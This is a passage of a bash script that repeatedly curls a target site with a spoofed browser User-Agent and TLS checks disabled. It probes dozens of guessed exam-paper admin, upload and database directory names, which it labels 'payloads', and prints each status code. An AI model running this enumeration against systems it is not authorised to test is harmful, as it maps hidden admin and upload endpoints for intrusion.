         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_DataOps/"]: "
